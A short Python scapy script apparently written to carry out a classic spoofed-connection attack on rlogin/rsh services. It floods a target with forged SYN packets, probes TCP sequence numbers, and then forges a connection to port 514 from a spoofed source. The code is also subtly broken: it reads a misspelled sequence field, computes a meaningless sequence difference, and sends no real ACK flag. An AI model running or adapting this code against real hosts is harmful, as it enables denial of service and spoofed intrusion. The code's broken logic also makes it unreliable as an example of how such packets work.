from scapy.all import *

def synFlood(src,tgt):
    for sport in range(1024,65535):
        IPLayer=IP(src=src,dst=tgt)
        TCPlayer=TCP(sport=sport,dport=513)

        pkt=IPLayer/TCPlayer
        send(pkt)

def callTSN(tgt):
    segNum=0
    prev_segNum=0
    diff=0

    pkt=IP(dst=tgt)/TCP()
    ans=sr1(pkt,verbose=0)
    segNum=ans.getlayer(TCP).seg
    diff=segNum-prev_segNum
    print('TCP seguence diffrence:'+str(diff))





def spoofConn(src,tgt,ack):
    IPlayer=IP(src=src,dst=tgt)
    TCPlayer=TCP(sport=513,dport=514)
    synPkt=IPlayer/TCPlayer

    send(synPkt)

    IPlayer=IP(src=src,dst=tgt)
    TCPlayer=TCP(sport=513,dport=514,ack=ack)

    ackPkt=IPlayer/TCPlayer

    send(ackPkt)


